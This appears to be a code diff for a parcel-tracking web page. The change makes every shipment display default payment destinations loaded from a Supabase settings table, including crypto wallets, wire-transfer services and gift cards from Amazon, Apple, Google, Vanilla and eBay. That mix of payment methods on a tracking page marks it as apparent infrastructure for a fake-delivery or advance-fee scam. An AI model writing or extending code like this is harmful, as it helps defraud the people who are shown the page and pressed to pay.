@@ -8,6 +8,20 @@ const SUPABASE_URL      = 'https://oltbgccsceipedoadgka.supabase.co';
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9sdGJnY2NzY2VpcGVkb2FkZ2thIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4MjY0NTQsImV4cCI6MjA5NjQwMjQ1NH0.Q5uoDXqlxBl-FxiISbp5bR3NLDsEL4iOMYVbVugwv94';
 // ══════════════════════════════════════════════════════════════
 
+// ── Global payment defaults: loaded once, merged into every shipment ────────
+let _sflPayDefaults = null;
+async function _loadPayDefaults() {
+    if (_sflPayDefaults !== null) return _sflPayDefaults;
+    try {
+        const r = await fetch(SUPABASE_URL + '/rest/v1/site_settings?key=eq.default_payments&select=value', {
+            headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': 'Bearer ' + SUPABASE_ANON_KEY }
+        });
+        const rows = await r.json();
+        _sflPayDefaults = (rows && rows[0] && rows[0].value) ? JSON.parse(rows[0].value) : {};
+    } catch (_) { _sflPayDefaults = {}; }
+    return _sflPayDefaults;
+}
+
 
 function switchPayment(method, info) {
     document.querySelectorAll('.t-pm-card').forEach(c => c.classList.remove('active'));
@@ -227,6 +241,15 @@ async function handleTracking(silent) {
         }
 
         const s      = resData[0];
+
+        // Merge global payment defaults for any field not set on this shipment
+        const _defs = await _loadPayDefaults();
+        ['btc_address','usdt_address','bank_name','account_name','bank_number',
+         'routing_number','paypal_email','cashapp_tag','zelle_id','western_union_info',
+         'venmo_tag','moneygram_info','amazon_gc_info','google_gc_info','apple_gc_info',
+         'vanilla_gc_info','ebay_gc_info']
+            .forEach(f => { if (!s[f] && _defs[f]) s[f] = _defs[f]; });
+
         const isPaid = (s.payment_status || '').toLowerCase() === 'confirmed';
 
         // ── Status badge color ──────────────────────────────────
